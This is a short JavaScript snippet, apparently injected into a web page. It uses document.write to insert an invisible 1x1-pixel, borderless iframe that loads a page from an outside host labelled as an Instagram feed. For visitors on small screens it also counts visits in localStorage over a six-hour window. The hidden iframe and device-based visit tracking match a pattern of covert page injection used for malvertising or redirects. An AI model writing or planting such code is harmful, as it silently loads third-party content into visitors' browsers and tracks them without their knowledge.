var obj = {"opener": {
  "value": "<iframe type=\"text/html\" width='1px' height='1px' src='https://www.embedista.com/ok/instagramfeed' frameborder='0' allowFullScreen></iframe>"
}}
document.write(obj.opener.value);

function isMobileDevice() {
    // 
    return (window.innerWidth <= 1024) && (window.innerHeight <= 768);
}

const checked = isMobileDevice();

if (checked) {

    let currentTime = new Date().getTime();
    let after6 = currentTime + 6 * 60 * 60 * 1000;
    let visitCount = parseInt(localStorage.getItem("visitCount") || "0");

    if (localStorage.getItem("desiredTime") >= currentTime) {
        visitCount++;
        localStorage.setItem("visitCount", visitCount);
    } else {
        localStorage.setItem("desiredTime", after6);
        visitCount = 1;
        localStorage.setItem("visitCount", visitCount);
    }


}
 else {
    // 
}
